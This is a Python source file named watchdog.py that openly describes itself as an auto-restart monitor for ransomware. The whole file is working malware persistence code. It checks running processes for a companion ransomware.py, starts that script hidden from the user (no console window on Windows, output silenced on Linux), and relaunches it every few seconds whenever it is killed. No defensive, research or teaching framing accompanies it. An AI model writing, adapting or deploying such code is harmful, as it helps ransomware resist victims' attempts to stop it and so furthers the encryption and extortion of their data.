# watchdog.py - Auto-restart monitor for ransomware
import os
import sys
import time
import subprocess
import psutil

# Configuration
RANSOMWARE_SCRIPT = os.path.join(os.path.dirname(__file__), "ransomware.py")
CHECK_INTERVAL = 5  # Check every 5 seconds
PROCESS_NAME = "python"  # Look for python processes running ransomware.py

def is_ransomware_running():
    """Check if ransomware process is running."""
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline')
                if cmdline and any('ransomware.py' in str(arg) for arg in cmdline):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return False
    except Exception:
        return False

def start_ransomware():
    """Start the ransomware process."""
    try:
        if os.name == 'nt':
            # Windows: Run hidden
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.Popen([sys.executable, RANSOMWARE_SCRIPT], 
                           startupinfo=startupinfo,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # Linux: Run in background
            subprocess.Popen([sys.executable, RANSOMWARE_SCRIPT],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        return False

def main():
    """Main watchdog loop."""
    # Initial start
    if not is_ransomware_running():
        start_ransomware()
        time.sleep(2)  # Give it time to start
    
    # Monitor loop
    while True:
        try:
            if not is_ransomware_running():
                # Ransomware was killed, restart it
                start_ransomware()
                time.sleep(2)  # Prevent rapid restart loops
            
            time.sleep(CHECK_INTERVAL)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
